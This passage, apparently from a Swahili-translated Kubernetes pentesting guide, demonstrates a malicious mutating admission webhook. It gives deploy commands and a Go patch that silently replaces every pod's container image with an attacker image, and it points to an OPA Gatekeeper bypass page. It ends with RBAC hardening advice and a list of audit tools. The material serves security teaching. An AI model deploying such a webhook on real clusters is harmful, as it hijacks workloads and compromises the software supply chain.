**Mfano kutoka** [**https://blog.rewanthtammana.com/creating-malicious-admission-controllers**](https://blog.rewanthtammana.com/creating-malicious-admission-controllers):
```bash
git clone https://github.com/rewanthtammana/malicious-admission-controller-webhook-demo
cd malicious-admission-controller-webhook-demo
./deploy.sh
kubectl get po -n webhook-demo -w
```
Angalia hali ili kuona kama iko tayari:
```bash
kubectl get mutatingwebhookconfigurations
kubectl get deploy,svc -n webhook-demo
```
![mutating-webhook-status-check.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433436353/yHUvUWugR.png?auto=compress,format&format=webp)

Kisha peleka pod mpya:
```bash
kubectl run nginx --image nginx
kubectl get po -w
```
Wakati unaweza kuona kosa la `ErrImagePull`, angalia jina la picha kwa kutumia mojawapo ya maswali yafuatayo:
```bash
kubectl get po nginx -o=jsonpath='{.spec.containers[].image}{"\n"}'
kubectl describe po nginx | grep "Image: "
```
![malicious-admission-controller.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433512073/leFXtgSzm.png?auto=compress,format&format=webp)

Kama unavyoona katika picha hapo juu, tulijaribu kuendesha picha `nginx` lakini picha iliyotekelezwa mwishowe ni `rewanthtammana/malicious-image`. Nini kimetokea!!?

#### Technicalities <a href="#heading-technicalities" id="heading-technicalities"></a>

Script ya `./deploy.sh` inaanzisha mutating webhook admission controller, ambayo inabadilisha maombi kwa API ya Kubernetes kama ilivyoainishwa katika mistari yake ya usanidi, ikishawishi matokeo yanayoonekana:
```
patches = append(patches, patchOperation{
Op:    "replace",
Path:  "/spec/containers/0/image",
Value: "rewanthtammana/malicious-image",
})
```
The above snippet replaces the first container image in every pod with `rewanthtammana/malicious-image`.

## OPA Gatekeeper bypass

{{#ref}}
../kubernetes-opa-gatekeeper/kubernetes-opa-gatekeeper-bypass.md
{{#endref}}

## Best Practices

### **Kuzima Automount ya Tokens za Akaunti ya Huduma**

- **Pods na Akaunti za Huduma**: Kwa kawaida, pods huweka token ya akaunti ya huduma. Ili kuboresha usalama, Kubernetes inaruhusu kuzima kipengele hiki cha automount.
- **Jinsi ya Kutumia**: Weka `automountServiceAccountToken: false` katika usanidi wa akaunti za huduma au pods kuanzia toleo la Kubernetes 1.6.

### **Kuteua Watumiaji kwa Uangalifu katika RoleBindings/ClusterRoleBindings**

- **Injini ya Uchaguzi**: Hakikisha kuwa watumiaji muhimu pekee wanajumuishwa katika RoleBindings au ClusterRoleBindings. Kagua mara kwa mara na uondoe watumiaji wasiokuwa na umuhimu ili kudumisha usalama mkali.

### **Majukumu Maalum ya Namespace Badala ya Majukumu ya Kiwango cha Klasta**

- **Majukumu dhidi ya ClusterRoles**: Prefer kutumia Majukumu na RoleBindings kwa ruhusa maalum za namespace badala ya ClusterRoles na ClusterRoleBindings, ambazo zinatumika kwa kiwango cha klasta. Njia hii inatoa udhibiti wa kina na inapunguza wigo wa ruhusa.

### **Tumia zana za kiotomatiki**

{{#ref}}
https://github.com/cyberark/KubiScan
{{#endref}}

{{#ref}}
https://github.com/aquasecurity/kube-hunter
{{#endref}}

{{#ref}}
https://github.com/aquasecurity/kube-bench
{{#endref}}

## **Marejeleo**

- [**https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions**](https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions)
- [**https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1**](https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1)
- [**https://blog.rewanthtammana.com/creating-malicious-admission-controllers**](https://blog.rewanthtammana.com/creating-malicious-admission-controllers)

{{#include ../../../banners/hacktricks-training.md}}
